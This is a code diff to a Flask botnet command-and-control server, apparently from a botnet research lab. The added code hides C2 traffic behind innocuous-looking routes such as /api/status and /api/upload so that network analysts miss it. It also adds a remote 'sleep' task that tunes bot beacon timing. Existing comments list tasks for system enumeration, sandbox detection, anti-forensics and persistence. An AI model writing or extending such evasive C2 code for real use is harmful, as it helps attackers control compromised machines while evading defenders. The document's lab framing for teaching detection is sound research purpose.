@@ -20,6 +20,17 @@ Key management in this demo:
 
 Usage: replaces c2_server.py on the C2 VM.
 Bot agent uses crypto_utils.py to decrypt responses.
+
+====================================================
+ ADDITIONS (minimal diff — original logic unchanged)
+====================================================
+Gap 1 — Stealth alias routes appended at the bottom.
+         /api/status, /api/upload, /api/push, /api/event,
+         /api/peers, /api/rotate delegate to the original
+         handlers. bot_agent.c paths untouched.
+Gap 2 — sleep task type: one early-return branch added
+         inside push_task() before the existing task = {}
+         block. All other task types flow unchanged.
 """
 
 import os
@@ -37,21 +48,15 @@ import system_profiler
 import persistence_sim
 import file_transfer
 from file_transfer import add_file_transfer_endpoints
-add_file_transfer_endpoints(app, auth_token=AUTH_TOKEN)
 from datetime import datetime
 from queue import Queue
 from flask import Flask, request, jsonify
 
 # ── Import AES from covert_bot.py or implement inline ─────────
-# Reuse the pure-Python AES-CBC from covert_bot module.
-# If covert_bot.py is in the same directory, import from it.
-# Otherwise, the aes_cbc functions are duplicated below for standalone use.
-
 try:
     from covert_bot import aes_cbc_encrypt, aes_cbc_decrypt, derive_key, derive_iv
     print("[C2-AES] Using AES from covert_bot module")
 except ImportError:
-    # Inline minimal AES for standalone use
     def _xor_bytes(a, b):
         return bytes(x ^ y for x, y in zip(a, b))
 
@@ -64,7 +69,6 @@ except ImportError:
         p = data[-1]
         return data[:-p] if 0 < p <= 16 else data
 
-    # Minimal AES-128-CBC using PyCryptodome if available, else warn
     try:
         from Crypto.Cipher import AES as _AES
         def aes_cbc_encrypt(pt, key, iv):
@@ -128,9 +132,7 @@ def decrypt_task(payload: dict) -> dict | None:
 # ── Encrypted C2 server ───────────────────────────────────────
 
 app = Flask(__name__)
-
-# After: app = Flask(__name__)
-from file_transfer import add_file_transfer_endpoints
+# FIX: moved here from top-of-file (app must exist before this call)
 add_file_transfer_endpoints(app, auth_token=AUTH_TOKEN)
 
 REGISTERED_BOTS = {}
@@ -241,6 +243,10 @@ def push_task():
 
     All fields present in the request body are passed through to the task dict
     so bots always receive the full parameterisation the operator intended.
+
+    Gap 2 — sleep task type (ADDED):
+      {"type":"sleep","min":N,"max":M}
+      Bot updates its poll interval without redeployment.
     """
     #   "system_profile"  — triggers full system enumeration (T1082/T1016/T1033)
     #   "sandbox_check"   — runs sandbox detection before payload
@@ -265,9 +271,29 @@ def push_task():
     # anti_forensics_status       List clearable lab artifacts
     # plant_persist [method]      Install persistence (cron|bashrc|systemd|...)
     # remove_persist [method]     Remove persistence
+    # sleep                       Remotely reconfigure bot poll interval (Gap 2)
 
     data   = request.get_json()
     bot_id = data.get("bot_id", "all")
+
+    # ── Gap 2: sleep task — handled before the general block ───
+    # Allows operator to remotely slow beacon intervals mid-operation
+    # without redeploying any bot binary.
+    if data.get("type") == "sleep":
+        task = {
+            "type":      "sleep",
+            "min":       int(data.get("min", 30)),
+            "max":       int(data.get("max", 90)),
+            "issued_at": datetime.now().isoformat(),
+        }
+        with lock:
+            targets = list(REGISTERED_BOTS.keys()) if bot_id == "all" else [bot_id]
+            for tid in targets:
+                if tid in TASK_QUEUES:
+                    TASK_QUEUES[tid].put(task)
+        log(f"TASK QUEUED type=sleep target={bot_id} min={task['min']}s max={task['max']}s")
+        return jsonify({"status": "queued", "task": task, "targets": targets})
+    # ── end Gap 2 ──────────────────────────────────────────────
 
     # Base fields
     task = {
@@ -292,7 +318,7 @@ def push_task():
         "anti_forensics_status": anti_forensics_sim.handle_c2_task,
         "system_profile":        system_profiler.handle_task,
     }
-    
+
     # Pass through all type-specific optional fields if present
     for field in ("cpu", "mode", "jitter", "workers"):
         if field in data:
@@ -392,6 +418,46 @@ def rotate_key():
         ),
     })
 
+
+# ══════════════════════════════════════════════════════════════
+#  Gap 1 — STEALTH ALIAS ROUTES (ADDED — purely additive)
+#
+#  Six new routes appended below. Zero changes to any existing
+#  route above. bot_agent.c which calls /register, /heartbeat,
+#  /result does not need recompilation.
+#
+#  Alias table:
+#    POST /api/event   →  register()    (bot registration)
+#    POST /api/status  →  heartbeat()   (beacon / task poll)
+#    POST /api/upload  →  result()      (result submission)
+#    POST /api/push    →  push_task()   (operator tasks + sleep)
+#    GET  /api/peers   →  list_bots()   (bot inventory)
+#    POST /api/rotate  →  rotate_key()  (AES key rotation)
+#
+#  Teaching point: /api/status looks like an uptime check,
+#  /api/upload like a log-shipping pipeline, /api/push like a
+#  notification queue — none signal C2 to a network analyst.
+# ══════════════════════════════════════════════════════════════
+
+@app.route("/api/event",  methods=["POST"])
+def api_event():   return register()
+
+@app.route("/api/status", methods=["POST"])
+def api_status():  return heartbeat()
+
+@app.route("/api/upload", methods=["POST"])
+def api_upload():  return result()
+
+@app.route("/api/push",   methods=["POST"])
+def api_push():    return push_task()
+
+@app.route("/api/peers",  methods=["GET"])
+def api_peers():   return list_bots()
+
+@app.route("/api/rotate", methods=["POST"])
+def api_rotate():  return rotate_key()
+
+
 if __name__ == "__main__":
     print("=" * 60)
     print(" Encrypted C2 Server - AUA Botnet Research Lab")
@@ -402,14 +468,22 @@ if __name__ == "__main__":
     print(f"\n[C2-AES] AES key: {_current_key.hex()}")
     print(f"[C2-AES] (Same key must be in bot_agent for decryption)")
     print(f"\nEndpoints:")
-    print(f"  POST /task        — push task to bots")
+    print(f"  POST /task        — push task to bots (incl. sleep type)")
     print(f"  POST /rotate_key  — rotate AES key (queues update_secret to all bots)")
     print(f"  GET  /bots        — list registered bots")
     print(f"  POST /encrypt_test — AES round-trip test")
+    print(f"\nStealth aliases (Gap 1):")
+    print(f"  POST /api/event /api/status /api/upload /api/push /api/rotate")
+    print(f"  GET  /api/peers")
     print(f"\nKey rotation example:")
     print(f"  curl -X POST http://localhost:5000/rotate_key \\")
     print(f"       -H 'Content-Type: application/json' \\")
     print(f"       -H 'X-Auth-Token: aw' \\")
     print(f"       -d '{{\"secret\":\"NEW_KEY_2026_XYZ\"}}'")
+    print(f"\nSleep task example (Gap 2):")
+    print(f"  curl -X POST http://localhost:5000/api/push \\")
+    print(f"       -H 'Content-Type: application/json' \\")
+    print(f"       -H 'X-Auth-Token: aw' \\")
+    print(f"       -d '{{\"bot_id\":\"all\",\"type\":\"sleep\",\"min\":120,\"max\":300}}'")
     print()
     app.run(host="0.0.0.0", port=5000, debug=False)
